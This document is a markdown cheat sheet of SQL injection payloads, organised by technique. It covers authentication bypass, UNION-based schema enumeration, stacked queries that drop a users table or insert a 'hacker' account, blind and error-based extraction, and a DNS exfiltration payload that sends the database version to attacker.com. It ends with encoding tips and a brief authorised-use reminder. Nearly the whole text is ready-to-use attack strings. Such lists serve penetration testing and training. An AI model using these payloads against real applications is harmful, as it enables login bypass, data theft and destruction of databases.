# SQL Injection Commands

## Discovery Payloads
```
'                    # Test for syntax error (odd quotes)
"                    # Test for syntax error
#                    # Comment out rest of query
-- -                 # Comment out rest of query
;                    # Terminate statement
)                    # Close parenthesis
```

## Authentication Bypass - OR Injection
```
' OR '1'='1          # Always true condition
' OR 1=1-- -         # Always true with comment
' OR 1=1#            # Always true with comment
' OR 'x'='x          # Always true condition
' OR 1=1 LIMIT 1--   # Return first user only
') OR ('1'='1        # Close parenthesis then inject
```

## Comment Out Password Check
```
'-- -                # Comment out everything after username
'#                   # Comment out everything after username
'/*                   # Multi-line comment start
```

## UNION Based Injection
```
' UNION SELECT 1--   # Test number of columns
' UNION SELECT 1,2-- # Find columns
' UNION SELECT 1,2,3-- # Continue until no error
```

## Database Enumeration
```
' UNION SELECT @@version--      # Get database version
' UNION SELECT database()--     # Get current database
' UNION SELECT user()--         # Get current user
' UNION SELECT schema_name FROM information_schema.schemata--  # List databases
```

## Table/Column Enumeration
```
' UNION SELECT table_name FROM information_schema.tables--     # List tables
' UNION SELECT column_name FROM information_schema.columns--   # List columns
' UNION SELECT table_name,column_name FROM information_schema.columns-- # Both
```

## Stacked Queries
```
'; DROP TABLE users--    # Drop table (if stacked queries supported)
'; INSERT INTO users VALUES('hacker','pass')--  # Insert new user
```

## Time-Based Blind SQLi
```
' AND SLEEP(5)--         # Delay response by 5 seconds
' OR SLEEP(5)--          # Sleep if condition true
' AND IF(1=1,SLEEP(5),0)-- # Conditional delay
```

## Error-Based Injection
```
' AND extractvalue(1,concat(0x7e,version()))--  # Extract version via error
' AND updatexml(1,concat(0x7e,user()),1)--      # Extract user via error
```

## Boolean Blind Injection
```
' AND 1=1--              # Returns true
' AND 1=2--              # Returns false
' AND SUBSTRING(version(),1,1)='8'--  # Check version character
```

## Out-of-Band (DNS) Injection
```
' UNION SELECT load_file(concat('\\\\',version(),'.attacker.com\\test'))--  # DNS exfil
```

---

> 💡 **Tips:**
> - Replace `'` with `"` if needed
> - Use URL encoding (`%27` for `'`, `%23` for `#`) in GET requests
> - Adjust syntax for different databases (MySQL, PostgreSQL, MSSQL, Oracle)
> - Test on authorized systems only
